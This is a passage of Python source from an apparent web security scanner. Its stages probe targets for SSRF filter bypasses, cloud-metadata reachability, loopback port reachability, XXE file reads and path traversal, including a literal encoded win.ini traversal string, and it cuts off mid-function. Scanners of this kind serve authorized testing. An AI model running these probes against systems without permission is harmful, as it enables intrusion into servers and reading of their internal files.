# STAGE D - BYPASS MATRIX (IP encodings / parser confusion / redirect bounce)
# ===========================================================================
def bypass_matrix(http, rec, base_url, meta, conf, cp, port):
    """Ek CONFIRMED/SUSPECTED fetch-endpoint par filter-bypass matrix:
    IP-encoding variants + URL-parser confusion + redirect-internal-bounce.
    Sirf loopback/own-host targets - ZERO external egress."""
    url = rec["url"]
    param = rec.get("param") or rec.get("needs_param") or "url"
    out = {"url": url, "param": param, "ip_variants": [], "parse_tricks": [],
           "redirect_bounce": None, "verdict": "SAFE", "winning_variant": "",
           "probes": 0}
    loop_host, loop_port = "127.0.0.1", (port or 9)
    canary = _canary("bp").lower()
    # control: plain dotted (agar ye bhi block hai to koi bypass signal nahi)
    def probe(inner):
        u = _fetch_url(base_url, rec, inner, param)
        out["probes"] += 1
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        return http.get(u, allow_redirects=False)

    ctrl = probe("http://%s:%d/%s" % (loop_host, loop_port, canary))
    ctrl_blocked = _is_waf_block(ctrl, []) or (ctrl.status in (400, 422))
    out["control"] = {"inner": "http://%s:%d/%s" % (loop_host, loop_port, canary),
                      "status": ctrl.status, "blocked": ctrl_blocked,
                      "sha1": ctrl.sha1()[:12]}
    if ctrl_blocked:
        # plain bhi block hai -> variant jo PASS ho jaye wo bypass hai
        pass
    else:
        # plain already works -> bypass matrix ka signal nahi (already reachable)
        out["verdict"] = "NA"
        return out

    def is_pass(r):
        return (not r.error and not _is_waf_block(r, [])
                and r.status not in (400, 403, 406, 422, 429))

    # ---- IP encoding variants (cap: ssrf_ip_variants) ----
    for label, host in ip_variants(loop_host, int(conf.get("ssrf_ip_variants", 16))):
        inner = "http://%s:%d/%s" % (host, loop_port, canary)
        r = probe(inner)
        row = {"variant": label, "host": host, "status": r.status,
               "error": r.error, "passed": bool(is_pass(r))}
        out["ip_variants"].append(row)
        if row["passed"] and not out["winning_variant"]:
            out["winning_variant"] = "ip:" + label
            out["verdict"] = "SUSPECTED"
    # ---- URL-parser confusion (cap: ssrf_parse_tricks) ----
    for label, inner in parse_tricks(loop_host, loop_port, "/" + canary,
                                     int(conf.get("ssrf_parse_tricks", 10))):
        r = probe(inner)
        row = {"variant": label, "inner": inner[:160], "status": r.status,
               "error": r.error, "passed": bool(is_pass(r))}
        out["parse_tricks"].append(row)
        if row["passed"] and not out["winning_variant"]:
            out["winning_variant"] = "parse:" + label
            out["verdict"] = "SUSPECTED"
    # ---- redirect-internal bounce (target khud 302 kare loopback par) ----
    if conf.get("ssrf_redirect_probe", True):
        redir_u = "%s/?%s=%s" % (
            base_url.rstrip("/"), "waspP15rdr",
            urllib.parse.quote("http://%s:%d/%s" % (loop_host, loop_port, canary),
                               safe=""))
        inner = redir_u
        r = probe(inner)
        row = {"variant": "redirect-bounce", "inner": inner[:160],
               "status": r.status, "error": r.error, "passed": bool(is_pass(r))}
        out["redirect_bounce"] = row
        if row["passed"]:
            out["winning_variant"] = out["winning_variant"] or "redirect-bounce"
            out["verdict"] = "SUSPECTED"
    return out


# ===========================================================================
# STAGE D2 - CLOUD METADATA ENGINE (CROWN JEWEL, SAFE-PATHS ONLY)
# ===========================================================================
def metadata_engine(http, qhttp, rec, base_url, meta, conf, cp):
    """Cloud metadata reachability via fetcher. SAFE paths only (FORBIDDEN_
    PATH_PATTERNS hard-filtered). Content: marker-boolean only (REDACTED)."""
    url = rec["url"]
    param = rec.get("param") or rec.get("needs_param") or "url"
    out = {"url": url, "probes": [], "verdict": "SAFE", "providers": [],
           "imds2_hint": False, "content_policy": "markers-only-redacted"}
    nx = "http://%s.invalid/%s" % (_canary("md").lower(), rand_str(5))
    r_nx = http.get(_fetch_url(base_url, rec, nx, param), allow_redirects=False)
    meta["probes_total"] = meta.get("probes_total", 0) + 1
    for pr in _metadata_probes(conf):
        pu = _fetch_url(base_url, rec, pr["url"], param)
        r = qhttp.get(pu, headers=pr["headers"], allow_redirects=False)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        txt = (r.text or "")[:1200].lower()
        hits = [m for m in pr["markers"] if m.lower() in txt]
        row = {"provider": pr["provider"], "safe_path": pr["url"],
               "status": r.status, "len": len(r.body), "error": r.error,
               "marker_hits": hits, "sha1_12": r.sha1()[:12] if not r.error else "",
               "sig": filesig(r.body)}
        # IMDSv2 hint (401 + "use IMDSv2" message = hardened metadata)
        if r.status == 401 and re.search(r"(imdsv2|token)", txt):
            out["imds2_hint"] = True
            row["note"] = "IMDSv2 (token-required) hardening signal"
        out["probes"].append(row)
        if hits and not r.error:
            out["providers"].append({"provider": pr["provider"],
                                     "markers": hits, "sig": row["sig"]})
            out["verdict"] = "CONFIRMED"
        elif hits:
            out["verdict"] = "SUSPECTED"
    out["manual_wave"] = METADATA_MANUAL_WAVE if out["providers"] else []
    return out


# ===========================================================================
# STAGE E - INTERNAL SMOKE (RoE gate: ssrf_internal_smoke, default OFF)
# ===========================================================================
SMOKE_PORTS_DEFAULT = (80, 443, 8080, 8000, 8443)


def internal_smoke(http, rec, base_url, meta, conf, cp, target_ip=None):
    """Loopback + own-IP port smoke THROUGH the fetcher (server-side view).
    1 GET per port, banner-only. RFC1918 sweep KABHI nahi - sirf target-host
    IP + loopback. Gated by conf ssrf_internal_smoke (default False)."""
    out = {"url": rec["url"], "gated": not conf.get("ssrf_internal_smoke"),
           "hosts": [], "policy": "target-host+loopback-only, banner-only, "
                                  "1 GET/port, no body storage"}
    if not conf.get("ssrf_internal_smoke"):
        return out
    ports = []
    for p in str(conf.get("ssrf_smoke_ports", "80,443,8080,8000,8443")).split(","):
        p = p.strip()
        if p.isdigit():
            ports.append(int(p))
    ports = ports[:5] or list(SMOKE_PORTS_DEFAULT)[:5]
    hosts = ["127.0.0.1"]
    if target_ip and target_ip not in hosts and target_ip != host_of(base_url):
        hosts.append(target_ip)
    param = rec.get("param") or rec.get("needs_param") or "url"
    canary = _canary("sm").lower()
    for h in hosts:
        rows = []
        for p in ports:
            inner = "http://%s:%d/%s" % (h, p, canary)
            r = http.get(_fetch_url(base_url, rec, inner, param),
                         allow_redirects=False)
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            rows.append({"host": h, "port": p, "status": r.status,
                         "error": r.error,
                         "server": (r.header("Server") or "")[:60],
                         "title": title_of(r.text)[:60],
                         "sig": filesig(r.body),
                         "verdict": ("REACHABLE" if not r.error and r.status and
                                     r.status < 500 else
                                     "UNKNOWN" if r.status and r.status >= 500
                                     else "CLOSED")})
        out["hosts"].append({"host": h, "ports": rows})
    return out


# ===========================================================================
# STAGE F - XXE ENGINE (GET-param probes always; POST = RoE gate)
# ===========================================================================
def _xml_post_ctx(rec):
    """XXE target record -> (post_url, is_post, param)."""
    return rec["url"], rec.get("method", "POST").upper() == "POST", \
        rec.get("param") or "xml"


def xxe_probe_endpoint(http, qhttp, rec, base_url, meta, conf, cp, smoke_port=None):
    """Ek XML/parse endpoint ka XXE probe set.
    GET-param XML: hamesha. POST-body XML: sirf ssrf_allow_post=true par
    (force_write=True chain). Content sirf marker-boolean (REDACTED)."""
    url, is_post, param = _xml_post_ctx(rec)
    post_allowed = bool(conf.get("ssrf_allow_post")) and is_post
    out = {"url": url, "method": rec.get("method", "GET" if not is_post else "POST"),
           "param": param, "post_gate": ("ON" if post_allowed else
                                         "OFF" + ("" if not is_post else " (RoE)")),
           "verdict": "SAFE", "technique": "", "signals": [], "probes": [],
           "parser_live": False, "dtd_rejected": False}
    canary_host = "%s.invalid" % _canary("xx").lower()

    def send(body, label):
        """XML body ko GET-param ya POST-body ke through bhejo (REDACTED sig)."""
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        if is_post and post_allowed:
            r = qhttp.request("POST", url, headers={"Content-Type": "application/xml"},
                              data=body.encode("utf-8", "ignore") if isinstance(
                                  body, str) else body,
                              force_write=True, allow_redirects=False)
        elif is_post and not post_allowed:
            return None                     # RoE gate: koi POST nahi jaata
        else:
            u = _fetch_url(base_url, rec, body, param) if rec.get(
                "needs_param") else url
            if rec.get("needs_param"):
                r = qhttp.get(u, allow_redirects=False)
            else:
                r = qhttp.get(u, headers={"Content-Type": "application/xml"},
                              allow_redirects=False)
        return r

    # ---- control: malformed XML (parser live + error-echo baseline) ----
    ctrl = send('<?xml version="1.0"?><wasp><unclosed></wasp>', "ctrl")
    if ctrl is None:
        out["verdict"] = "SKIPPED"
        out["signals"].append("post-gate-off")
        return out
    ctrl_sig = {"status": ctrl.status, "len": len(ctrl.body),
                "sha1": ctrl.sha1()[:12], "errfam": xxe_error_family(ctrl.text)}
    out["probes"].append({"probe": "control-malformed", "sig": ctrl_sig})
    if ctrl.error and not ctrl_sig["errfam"]:
        out["verdict"] = "NOISE"
        out["signals"].append("transport-error")
        return out
    if ctrl_sig["errfam"] or ctrl.status in (400, 422, 500):
        out["parser_live"] = True

    def diff(r, label, extra=None):
        """Control se differential -> signal string."""
        sig = {"status": r.status, "len": len(r.body), "sha1": r.sha1()[:12],
               "errfam": xxe_error_family(r.text)}
        row = {"probe": label, "sig": sig}
        if extra:
            row.update(extra)
        out["probes"].append(row)
        return row, sig

    # ---- 1) classic external entity (in-band + error-based) ----
    for fname, fdef in (("hostname", XXE_CANARY_FILE),
                        ("passwd-marker", XXE_MARKER_FILE)):
        body = xxe_classic("file://" + fdef, "waspxxe")
        r = send(body, "classic-" + fname)
        if r is None:
            continue
        row, sig = diff(r, "classic-" + fname)
        txt = r.text[:800]
        hit = None
        if fname == "passwd-marker":
            hit = next((m for m in PASSWD_MARKERS if m in txt), None)
        else:
            first = txt.strip().splitlines()[0] if txt.strip() else ""
            if HOSTNAME_SHAPE.match(first) and "<" not in first and \
                    len(r.body) <= 512:
                hit = "hostname-shape"
        if hit:
            row["marker"] = hit
            row["sig"]["content_stored"] = False
            out["signals"].append("classic-%s:in-band-marker(%s)" % (fname, hit))
            out["verdict"] = "CONFIRMED"
            out["technique"] = out["technique"] or "xxe-classic-external-entity"
        elif sig["errfam"] and (sig["len"] != ctrl_sig["len"] or
                                sig["status"] != ctrl_sig["status"]):
            out["signals"].append("classic-%s:error-differential(%s)" %
                                  (fname, sig["errfam"]))
            if out["verdict"] == "SAFE":
                out["verdict"] = "SUSPECTED"
                out["technique"] = "xxe-error-based"

    # ---- 2) param-entity blind (DTD fetch attempt -> .invalid) ----
    body = xxe_param_entity("http://%s/p15.dtd" % canary_host)
    r = send(body, "param-entity")
    if r is not None:
        row, sig = diff(r, "param-entity-blind")
        if sig["errfam"] and (sig["len"] != ctrl_sig["len"] or
                              sig["status"] != ctrl_sig["status"]):
            out["signals"].append("param-entity:error(%s)" % sig["errfam"])
            if out["verdict"] == "SAFE":
                out["verdict"] = "SUSPECTED"
                out["technique"] = out["technique"] or "xxe-param-entity-blind"

    # ---- 3) internal DTD fetch (XXE->SSRF chain via parser) ----
    dtd_u = "http://127.0.0.1:%d/%s.dtd" % (smoke_port or 9, _canary("dtd").lower())
    body = xxe_dtd_internal(dtd_u)
    r = send(body, "dtd-internal")
    if r is not None:
        row, sig = diff(r, "dtd-internal-fetch")
        if sig != ctrl_sig and (sig["errfam"] or sig["status"] != ctrl_sig["status"]):
            out["signals"].append("dtd-internal:parser-fetched-url-signal")
            if out["verdict"] == "SAFE":
                out["verdict"] = "SUSPECTED"
                out["technique"] = out["technique"] or "xxe-dtd-fetch-internal"

    # ---- 4) XInclude (fragment parse) ----
    body = xxe_xinclude("file://" + XXE_CANARY_FILE)
    r = send(body, "xinclude")
    if r is not None:
        row, sig = diff(r, "xinclude")
        first = r.text.strip().splitlines()[0] if r.text.strip() else ""
        if HOSTNAME_SHAPE.match(first) and "<" not in first and len(r.body) <= 512:
            row["marker"] = "hostname-shape"
            out["signals"].append("xinclude:in-band-read")
            out["verdict"] = "CONFIRMED"
            out["technique"] = out["technique"] or "xxe-xinclude"
        elif sig["errfam"] and not ctrl_sig["errfam"] and \
                out["verdict"] == "SAFE":
            out["verdict"] = "SUSPECTED"

    # ---- 5) php://filter (double-decode roundtrip) ----
    body = xxe_php_filter(XXE_CANARY_FILE)
    r = send(body, "php-filter")
    if r is not None:
        row, sig = diff(r, "php-filter")
        first = r.text.strip().splitlines()[0] if r.text.strip() else ""
        if HOSTNAME_SHAPE.match(first) and "<" not in first and len(r.body) <= 512:
            row["marker"] = "hostname-shape"
            out["signals"].append("php-filter:wrapper-resolved")
            out["verdict"] = "CONFIRMED"
            out["technique"] = out["technique"] or "xxe-php-filter"

    # ---- 6) hardened-parser detect (DTD reject prints) ----
    low = (ctrl.text or "").lower()
    if any(p in low for p in DTD_REJECT_PRINTS):
        out["dtd_rejected"] = True
        out["signals"].append("parser:doctype-rejected(hardened)")
        if out["verdict"] == "SAFE":
            out["verdict"] = "HARDENED"

    out["evidence_note"] = ("file content kabhi store nahi hota; sirf "
                            "len/sha1/marker-boolean (detection-only)")
    return out


def xxe_post_family_probes(http, qhttp, rec, base_url, meta, conf, cp,
                           smoke_port=None):
    """POST-only XXE families (SVG / docx / SAML / xmlrpc) - RoE gated.
    ssrf_allow_post=False -> koi POST nahi jaata (records SKIPPED)."""
    url = rec["url"]
    out = {"url": url, "families": [], "verdict": "SKIPPED"}
    if not conf.get("ssrf_allow_post"):
        out["note"] = "ssrf_allow_post=false -> POST probes nahi bheje gaye"
        return out
    kind = rec.get("extra_kind") or ""
    canary_file = XXE_CANARY_FILE
    fams = []
    if "saml" in (url or "").lower() or rec.get("saml"):
        fams.append(("saml", "application/xml", xxe_saml("file://" + canary_file)))
    if "svg" in (url or "").lower() or kind == "svg":
        fams.append(("svg", "image/svg+xml", xxe_svg("file://" + canary_file)))
    if "docx" in (url or "").lower() or "import" in (url or "").lower() or \
            kind == "docx":
        fams.append(("docx", "application/vnd.openxmlformats-officedocument."
                             "wordprocessingml.document",
                     xxe_docx_bytes("file://" + canary_file)))
    if "xmlrpc" in (url or "").lower() or "/rpc2" in (url or ""):
        fams.append(("xmlrpc", "text/xml", xxe_xmlrpc_list()))
    if not fams:
        fams.append(("generic-xml", "application/xml",
                     xxe_classic("file://" + canary_file, "waspxxe")))
    for label, ctype, body in fams[:int(conf.get("ssrf_xxe_payloads", 8))]:
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        r = qhttp.request("POST", url, headers={"Content-Type": ctype},
                          data=body if isinstance(body, bytes) else
                          body.encode("utf-8", "ignore"),
                          force_write=True, allow_redirects=False)
        txt = r.text[:800]
        hit = next((m for m in PASSWD_MARKERS if m in txt), None)
        first = txt.strip().splitlines()[0] if txt.strip() else ""
        if not hit and label != "xmlrpc" and HOSTNAME_SHAPE.match(first) and \
                "<" not in first and len(r.body) <= 512:
            hit = "hostname-shape"
        if label == "xmlrpc":
            hit = next((m for m in XMLRPC_LIVE_MARKERS if m in txt.lower()), None)
        row = {"family": label, "status": r.status, "len": len(r.body),
               "marker": hit, "errfam": xxe_error_family(txt),
               "sig": filesig(r.body)}
        out["families"].append(row)
        if hit:
            out["verdict"] = "CONFIRMED"
            row["verdict"] = "CONFIRMED"
        elif row["errfam"]:
            out["verdict"] = "SUSPECTED" if out["verdict"] != "CONFIRMED" \
                else out["verdict"]
    return out


# ===========================================================================
# STAGE G - TRAVERSAL ULTRA MATRIX (content-redacted, 30 encoding variants)
# ===========================================================================
def traversal_file_markers(fname):
    for f in TRAVERSAL_FILES:
        if f["label"] == fname:
            return f
    return TRAVERSAL_FILES[0]


def traversal_probe_endpoint(http, qhttp, rec, base_url, meta, conf, cp,
                             stack_hints=None):
    """Ek file/path endpoint par traversal matrix.
    Encoding x depth x non-secret targets; content sirf marker-boolean."""
    url = rec["url"]
    param = rec.get("param") or rec.get("needs_param") or "path"
    out = {"url": url, "param": param, "verdict": "SAFE", "technique": "",
           "signals": [], "probes": [], "winning_variant": "", "probes_used": 0}
    # control: benign non-existent file (soft-404 template baseline)
    ctrl_path = "%s%s" % ("waspP15noexist", rand_str(6))
    ctrl = qhttp.get(_trav_url(url, param, ctrl_path), allow_redirects=False)
    meta["probes_total"] = meta.get("probes_total", 0) + 1
    if ctrl.error:
        out["verdict"] = "NOISE"
        out["signals"].append("transport-error")
        return out
    if _is_waf_block(ctrl, []):
        out["verdict"] = "BLOCKED"
        out["signals"].append("waf-blocked-probe")
        return out
    ctrl_sig = {"status": ctrl.status, "len": len(ctrl.body), "sha1": ctrl.sha1()}
    out["probes"].append({"probe": "control-nonexistent", "sig": {"status":
        ctrl_sig["status"], "len": ctrl_sig["len"], "sha1": ctrl_sig["sha1"][:12]}})

    windows = bool(stack_hints and ("windows" in stack_hints or "iis" in stack_hints))
    budget = int(conf.get("ssrf_traverse_probes", 24))
    used = 0
    best = None
    for variant in TRAVERSAL_VARIANTS:
        if used >= budget or best:
            break
        for fdef in TRAVERSAL_FILES[:2]:            # hostname + passwd (safe set)
            if used >= budget or best:
                break
            label, value = traversal_build(variant, 6, fdef["posix"])
            r = qhttp.get(_trav_url(url, param, value), allow_redirects=False)
            used += 1
            out["probes_used"] = used
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            txt = r.text[:800]
            marker = next((m for m in fdef["markers"] if m in txt), None)
            shape_hit = None
            if fdef["label"] == "etc-hostname":
                first = txt.strip().splitlines()[0] if txt.strip() else ""
                if HOSTNAME_SHAPE.match(first) and "<" not in first and \
                        len(r.body) <= 512:
                    shape_hit = "hostname-shape"
            row = {"variant": variant[0], "file": fdef["label"],
                   "path_sample": (value[:60] + "...") if len(value) > 60 else value,
                   "status": r.status, "len": len(r.body),
                   "sha1_12": r.sha1()[:12] if not r.error else "",
                   "marker": marker or shape_hit,
                   "soft404": is_soft404(r, meta.get("soft404", {})),
                   "sig": filesig(r.body)}
            out["probes"].append(row)
            interesting = (marker or shape_hit) and not row["soft404"] and \
                not r.error and row["sha1_12"] != ctrl_sig["sha1"][:12]
            if interesting:
                best = row
                out["winning_variant"] = variant[0]
                out["signals"].append(
                    "traversal:%s-marker(%s,len=%d)" % (
                        variant[0], marker or shape_hit, len(r.body)))
                out["verdict"] = "CONFIRMED"
                out["technique"] = ("traversal-absolute" if variant[0] in
                                    ("abs-inject", "scheme-file")
                                    else "traversal-encoding")
                if variant[0] == "null-byte" or variant[0] == "null-byte-slash":
                    out["technique"] = "traversal-null-byte-legacy"
    # absolute-path injection + windows variants (budget bacha ho to)
    if not best and used < budget:
        for fdef in TRAVERSAL_FILES[:2]:
            r = qhttp.get(_trav_url(url, param, fdef["posix"]), allow_redirects=False)
            used += 1
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            txt = r.text[:800]
            marker = next((m for m in fdef["markers"] if m in txt), None)
            if marker and not is_soft404(r, meta.get("soft404", {})):
                out["signals"].append("traversal:absolute-path-marker(%s)" % marker)
                out["verdict"] = "CONFIRMED"
                out["technique"] = "traversal-absolute"
                out["winning_variant"] = "abs-inject"
                break
    if windows and used < budget and not best:
        fdef = TRAVERSAL_FILES[3]                   # win.ini
        label, value = ("bs-enc", "..%5c..%5c..%5cwindows%5cwin.ini")
        r = qhttp.get(_trav_url(url, param, value), allow_redirects=False)
        used += 1
        txt = r.text[:800]
        marker = next((m for m in fdef["markers"] if m in txt), None)
        if marker:
            out["signals"].append("traversal:windows-enc-marker(%s)" % marker)
            out["verdict"] = "CONFIRMED"
            out["technique"] = "traversal-encoding"
            out["winning_variant"] = label
    # hardened signal: sab variants blocked/normalized (koi marker nahi, error
    # messages me traversal-refuse fingerprints)
    if out["verdict"] == "SAFE":
        low = (ctrl.text or "").lower()
        if any(p in low for p in ("illegal", "invalid path", "traversal",
                                  "path not allowed", "detected")):
            out["verdict"] = "HARDENED"
            out["signals"].append("path-filter:explicit-refuse")
        elif not out["signals"]:
            out["signals"].append("no-marker-%d-probes" % used)
            out["verdict"] = "SAFE"
    out["probes"] = out["probes"][:40]              # evidence cap
    return out


def _trav_url(url, param, value):
    """Path-param URL: ?param=value (existing query preserve).
    FIX-5: seed url ka trailing empty 'param=' strip (dup-param guard).
    IMPORTANT: value ko quote NAHI karte - traversal encodings (../%2e%2e/..)
    pehle se encoded hain; dobara encode karne se variant intent toot jaata."""
    for suf in ("?%s=" % param, "&%s=" % param):
        if url.endswith(suf):
            url = url[:-len(suf)]
            break
    joiner = "&" if "?" in url and "=" in url.split("?")[-1] else (
        "" if url.endswith("?") else ("&" if "?" in url else "?"))
    return "%s%s%s=%s" % (url, joiner, param, value)


# ===========================================================================
# STAGE H - DIFFERENTIAL SUMMARY (aggregate stats across fetch endpoints)
# ===========================================================================
def differential_summary(fetch_recs, conf):
    """Sab fetch endpoints ke probes ka aggregate differential engine record."""
    agg = {"endpoints": len(fetch_recs), "confirmed": 0, "suspected": 0,
           "blocked": 0, "full_read": [], "blind": [], "waf_blocked": [],
           "signals_top": {}}
    for r in fetch_recs:
        v = r.get("verdict")
        if v == "CONFIRMED":
            agg["confirmed"] += 1
            agg["full_read"].append(r["url"])
        elif v == "SUSPECTED":
            agg["suspected"] += 1
            agg["blind"].append(r["url"])
        elif v == "BLOCKED":
            agg["blocked"] += 1
            agg["waf_blocked"].append(r["url"])
        for s in r.get("signals", []):
            k = s.split(":")[0]
            agg["signals_top"][k] = agg["signals_top"].get(k, 0) + 1
    return agg


# ===========================================================================
# STAGE I - TECHNIQUE MATRIX (40+ rows - saari SSRF/XXE/traversal families)
# ===========================================================================
def build_technique_matrix(fetch_recs, bypass_recs, metadata_recs, smoke_recs,
                           xxe_recs, xxe_post_recs, trav_recs, header_recs):
    """(technique, family, status, evidence_count, notes) rows."""
    rows = []

    def row(tech, fam, status, cnt, note=""):
        rows.append({"technique": tech, "family": fam, "status": status,
                     "evidence_count": cnt, "notes": note})

    def any_verdict(recs, v):
        return sum(1 for r in recs if r.get("verdict") == v)

    # ---- SSRF core ----
    row("classic-server-side-fetch", "ssrf",
        "CONFIRMED" if any_verdict(fetch_recs, "CONFIRMED") else
        ("SUSPECTED" if any_verdict(fetch_recs, "SUSPECTED") else "SAFE"),
        any_verdict(fetch_recs, "CONFIRMED") + any_verdict(fetch_recs, "SUSPECTED"))
    row("full-response-read", "ssrf",
        "CONFIRMED" if any(r.get("technique") == "full-response-ssrf"
                           for r in fetch_recs) else "SAFE",
        sum(1 for r in fetch_recs if "full-read" in " ".join(r.get("signals", []))),
        "homepage/canary sha1 match via fetcher")
    row("blind-differential", "ssrf",
        "CONFIRMED" if any(r.get("technique") == "blind-differential-ssrf"
                           for r in fetch_recs) else
        ("SUSPECTED" if any_verdict(fetch_recs, "SUSPECTED") else "SAFE"),
        sum(1 for r in fetch_recs if "blind:" in " ".join(r.get("signals", []))))
    row("file-scheme-fetch", "ssrf",
        "CONFIRMED" if any("scheme-file" in s for r in fetch_recs
                           for s in r.get("signals", [])) else "SAFE",
        sum(1 for r in fetch_recs if "scheme-file" in " ".join(
            r.get("signals", []))), "file:// via URL-fetcher (LFI chain)")
    for fam in ("decimal", "hex32", "octal32", "zero-pad", "ipv6-mapped",
                "enclosed-alnum", "fullwidth-dot", "trailing-dot"):
        wins = [b for b in bypass_recs
                if (b.get("winning_variant") or "") == "ip:" + fam]
        row("ip-encoding-%s" % fam, "ssrf-bypass",
            "SUSPECTED" if wins else ("BLOCKED" if any(
                b.get("control", {}).get("blocked") for b in bypass_recs) else "SAFE"),
            len(wins))
    for fam in ("userinfo-at", "fragment-attacker", "triple-slash",
                "backslash-scheme", "redirect-bounce"):
        wins = [b for b in bypass_recs
                if (b.get("winning_variant") or "") in ("parse:" + fam, fam)]
        row("parser-confusion-%s" % fam, "ssrf-bypass",
            "SUSPECTED" if wins else "SAFE", len(wins))
    # ---- metadata ----
    md_conf = [m for m in metadata_recs if m.get("verdict") == "CONFIRMED"]
    row("cloud-metadata-imds", "cloud",
        "CONFIRMED" if md_conf else ("SUSPECTED" if any(
            m.get("verdict") == "SUSPECTED" for m in metadata_recs) else "SAFE"),
        len(md_conf), "169.254.169.254 family (safe-paths only)")
    row("imdsv2-hardening", "cloud",
        "PRESENT" if any(m.get("imds2_hint") for m in metadata_recs) else "UNKNOWN",
        sum(1 for m in metadata_recs if m.get("imds2_hint")),
        "token-required metadata = SSRF partial-block")
    row("imds-credential-path", "cloud", "MANUAL-ONLY", 0,
        "security-credentials/paths kabhi auto nahi - RoE manual wave")
    # ---- smoke ----
    sm_on = [s for s in smoke_recs if not s.get("gated")]
    reach = sum(1 for s in sm_on for hh in s.get("hosts", [])
                for p in hh.get("ports", []) if p.get("verdict") == "REACHABLE")
    row("internal-port-smoke", "ssrf",
        "SUSPECTED" if reach else ("GATED" if not sm_on else "SAFE"),
        reach, "loopback+own-IP only, 5 benign ports")
    row("gopher-dict-legacy-scheme", "ssrf", "MANUAL-ONLY", 0,
        "destructive misuse possible (redis/smtp) - kabhi probe nahi")
    row("dns-rebinding-toctou", "ssrf", "MANUAL-ONLY", 0,
        "attacker DNS chahiye - hypothesis-only")
    # ---- header host ----
    hh = [h for h in header_recs if h.get("verdict") == "SUSPECTED"]
    row("host-header-injection", "ssrf",
        "SUSPECTED" if hh else "SAFE", len(hh),
        "X-Forwarded-Host reflection -> cache/reset poison chain")
    row("x-original-url-routing", "ssrf",
        "SUSPECTED" if any("original" in (p.get("probe") or "")
                           for h in header_recs for p in h.get("probes", [])
                           if p.get("note")) else "SAFE",
        sum(1 for h in header_recs for p in h.get("probes", [])
            if "differential" in (p.get("note") or "")))
    # ---- XXE families ----
    def xx(tech_prefix):
        return sum(1 for r in xxe_recs
                   if any(s.startswith(tech_prefix) for s in r.get("signals", [])))
    row("xxe-classic-external-entity", "xxe",
        "CONFIRMED" if any(r.get("verdict") == "CONFIRMED" and
                           "classic" in " ".join(r.get("signals", []))
                           for r in xxe_recs) else
        ("SUSPECTED" if xx("classic") else "SAFE"), xx("classic"))
    row("xxe-param-entity-blind", "xxe",
        "SUSPECTED" if xx("param-entity") else "SAFE", xx("param-entity"))
    row("xxe-dtd-internal-fetch", "xxe",
        "SUSPECTED" if xx("dtd-internal") else "SAFE", xx("dtd-internal"),
        "XXE->SSRF chain via parser")
    row("xxe-xinclude", "xxe",
        "CONFIRMED" if any(r.get("technique") == "xxe-xinclude"
                           for r in xxe_recs) else
        ("SUSPECTED" if xx("xinclude") else "SAFE"), xx("xinclude"))
    row("xxe-php-filter", "xxe",
        "CONFIRMED" if any(r.get("technique") == "xxe-php-filter"
                           for r in xxe_recs) else
        ("SUSPECTED" if xx("php-filter") else "SAFE"), xx("php-filter"))
    post_conf = sum(1 for r in xxe_post_recs if r.get("verdict") == "CONFIRMED")
    post_susp = sum(1 for r in xxe_post_recs if r.get("verdict") == "SUSPECTED")
    row("xxe-svg-upload", "xxe",
        "CONFIRMED" if any(f.get("family") == "svg" and f.get("verdict") ==
                           "CONFIRMED" for r in xxe_post_recs
                           for f in r.get("families", [])) else
        ("SUSPECTED" if any(f.get("family") == "svg" and f.get("errfam")
                            for r in xxe_post_recs
                            for f in r.get("families", [])) else
         ("GATED" if any(r.get("verdict") == "SKIPPED" for r in xxe_post_recs)
          else "SAFE")),
        sum(1 for r in xxe_post_recs for f in r.get("families", [])
            if f.get("family") == "svg"))
    row("xxe-docx-import", "xxe",
        "CONFIRMED" if any(f.get("family") == "docx" and f.get("marker")
                           for r in xxe_post_recs for f in r.get("families", []))
        else ("GATED" if any(r.get("verdict") == "SKIPPED"
                             for r in xxe_post_recs) else "SAFE"),
        sum(1 for r in xxe_post_recs for f in r.get("families", [])
            if f.get("family") == "docx" and f.get("marker")))
    row("xxe-saml-assertion", "xxe",
        "CONFIRMED" if any(f.get("family") == "saml" and f.get("marker")
                           for r in xxe_post_recs for f in r.get("families", []))
        else ("GATED" if any(r.get("verdict") == "SKIPPED"
                             for r in xxe_post_recs) else "SAFE"),
        sum(1 for r in xxe_post_recs for f in r.get("families", [])
            if f.get("family") == "saml" and f.get("marker")))
    row("xxe-xmlrpc-pingback", "xxe",
        "CONFIRMED" if any(f.get("family") == "xmlrpc" and f.get("marker")
                           for r in xxe_post_recs for f in r.get("families", []))
        else ("GATED" if any(r.get("verdict") == "SKIPPED"
                             for r in xxe_post_recs) else "SAFE"),
        sum(1 for r in xxe_post_recs for f in r.get("families", [])
            if f.get("family") == "xmlrpc" and f.get("marker")),
        "write-methods MANUAL-ONLY")
    row("xxe-parser-hardened", "xxe",
        "PRESENT" if any(r.get("dtd_rejected") for r in xxe_recs) else "UNKNOWN",
        sum(1 for r in xxe_recs if r.get("dtd_rejected")))
    row("xxe-billion-laughs", "xxe", "FORBIDDEN", 0,
        "DoS-class payload - detection-only RoE me kabhi nahi bhejte")
    # ---- traversal families ----
    trav_conf = [t for t in trav_recs if t.get("verdict") == "CONFIRMED"]
    row("traversal-encoding-matrix", "traversal",
        "CONFIRMED" if trav_conf else "SAFE", len(trav_conf),
        "30 variants: raw/url/double/overlong/fullwidth/tomcat/spring/null")
    for fam in ("double-enc", "overlong-utf8-af", "fullwidth", "semicolon-tomcat",
                "null-byte", "abs-inject", "scheme-file"):
        wins = [t for t in trav_recs if t.get("winning_variant") == fam]
        row("traversal-%s" % fam, "traversal",
            "CONFIRMED" if wins else "SAFE", len(wins))
    row("traversal-windows-unc", "traversal", "MANUAL-ONLY", 0,
        "UNC/network paths destructive-side-effect risk - manual only")
    return rows


# ===========================================================================
# STAGE J - KILL-CHAINS + MANUAL-WAVE HYPOTHESES
# ===========================================================================
def build_ssrf_chains(F, fetch_recs, metadata_recs, xxe_recs, xxe_post_recs,
                      trav_recs, bypass_recs, header_recs, smoke_recs):
    """8+ ranked kill-chains (impact narratives - execution KABHI nahi)."""
    chains = []
    fr = [r for r in fetch_recs if r.get("verdict") == "CONFIRMED"]
    bl = [r for r in fetch_recs if r.get("verdict") == "SUSPECTED"]
    md = [m for m in metadata_recs if m.get("verdict") == "CONFIRMED"]
